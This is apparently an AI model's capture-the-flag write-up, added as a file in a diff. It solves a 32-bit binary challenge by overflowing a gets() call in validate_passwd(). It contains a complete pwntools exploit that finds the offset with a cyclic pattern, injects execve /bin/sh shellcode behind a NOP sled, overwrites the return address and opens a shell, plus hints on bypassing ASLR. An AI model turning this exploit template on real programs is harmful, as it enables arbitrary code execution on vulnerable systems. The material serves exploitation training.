@@ -1,0 +1,114 @@
+To solve this challenge using `pwntools`, you need to exploit the vulnerability in the `gets()` function in the `validate_passwd()` function. The `gets()` function does not check the length of the input, which allows for a **buffer overflow**. This can be used to overwrite the return address on the stack and gain control of the program's execution flow.
+
+Here are the steps and the corresponding code to solve this challenge:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF file.
+   - The `gets()` function in `validate_passwd()` is vulnerable to a buffer overflow.
+   - The `check()` function uses `mprotect()` to make the memory writable, executable, and readable, which can be useful for shellcode injection.
+
+2. **Find the Offset**:
+   - Use a cyclic pattern to determine the offset to overwrite the return address.
+
+3. **Craft the Payload**:
+   - Inject shellcode into the buffer.
+   - Overwrite the return address with the address of the buffer where the shellcode resides.
+
+4. **Exploit the Binary**:
+   - Use `pwntools` to send the payload and gain a shell.
+
+---
+
+### Code to Solve the Challenge
+
+Here is the Python code using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './int'
+elf = ELF(binary)
+
+# Start the process
+p = process(binary)
+
+# Step 1: Find the offset
+# Generate a cyclic pattern to find the offset
+payload = cyclic(100)  # Generate a pattern of 100 bytes
+p.sendline(payload)
+p.wait()  # Wait for the process to crash
+
+# Get the core dump to find the offset
+core = p.corefile
+eip = core.eip  # Get the value of EIP (return address)
+offset = cyclic_find(eip)  # Find the offset in the pattern
+log.info(f"Offset found: {offset}")
+
+# Step 2: Craft the payload
+# Shellcode for 32-bit Linux (execve /bin/sh)
+shellcode = asm(shellcraft.sh())
+
+# Address of the buffer (you can use GDB to find this or use a NOP sled)
+buffer_address = 0xffffd000  # Replace with the actual address of the buffer
+
+# Create the payload
+payload = flat(
+    asm('nop') * (offset - len(shellcode)),  # NOP sled
+    shellcode,                              # Inject shellcode
+    buffer_address                          # Overwrite return address
+)
+
+# Step 3: Exploit the binary
+# Restart the process
+p = process(binary)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Finding the Offset**:
+   - A cyclic pattern is sent to the program to cause a crash.
+   - The core dump is analyzed to find the value of the instruction pointer (EIP), which tells us where the buffer overflow occurred.
+   - The `cyclic_find()` function is used to determine the exact offset to overwrite the return address.
+
+2. **Crafting the Payload**:
+   - The payload consists of:
+     - A NOP sled to ensure the shellcode is executed.
+     - The shellcode itself (generated using `pwntools`' `shellcraft` module).
+     - The address of the buffer where the shellcode resides.
+
+3. **Exploiting the Binary**:
+   - The payload is sent to the program, and the return address is overwritten with the address of the buffer containing the shellcode.
+   - This gives control of the program to the attacker, allowing them to execute arbitrary code (in this case, a shell).
+
+---
+
+### Notes
+
+- Replace `buffer_address` with the actual address of the buffer. You can find this using GDB or by analyzing the binary.
+- If ASLR (Address Space Layout Randomization) is enabled, you may need to bypass it using techniques like leaking an address or using a ROP chain.
+- Ensure that the binary is running in an environment where `mprotect()` allows execution of the shellcode.
+
+---
+
+### Tools to Use
+
+- **GDB**: To debug the binary and find the buffer address.
+- **Pwntools**: For crafting the exploit and automating the attack.
+- **Checksec**: To analyze the binary's protections (e.g., ASLR, NX, PIE).
+
+---
+
+Let me know if you need further clarification or assistance!
